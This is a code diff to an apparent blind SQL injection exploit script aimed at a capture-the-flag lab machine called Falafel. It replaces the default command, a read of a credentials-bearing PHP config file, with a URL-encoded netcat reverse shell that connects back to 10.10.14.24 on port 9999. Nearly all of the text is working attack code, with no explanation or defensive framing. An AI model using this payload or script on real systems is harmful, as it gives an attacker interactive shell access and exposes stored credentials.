@@ -7,7 +7,7 @@ parser = argparse.ArgumentParser(description='Blind SQL Injection Boolean (Falaf
 
 parser.add_argument("--hostname", default='http://10.10.10.73/', type=str,
                     help="Hostname of falafel box")
-parser.add_argument("--command", default='cat /var/www/html/connection.php', type=str,
+parser.add_argument("--command", default='rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.24%209999%20%3E%2Ftmp%2Ff', type=str,
                     help="Command to execute on Falafel")
 
 args = parser.parse_args()
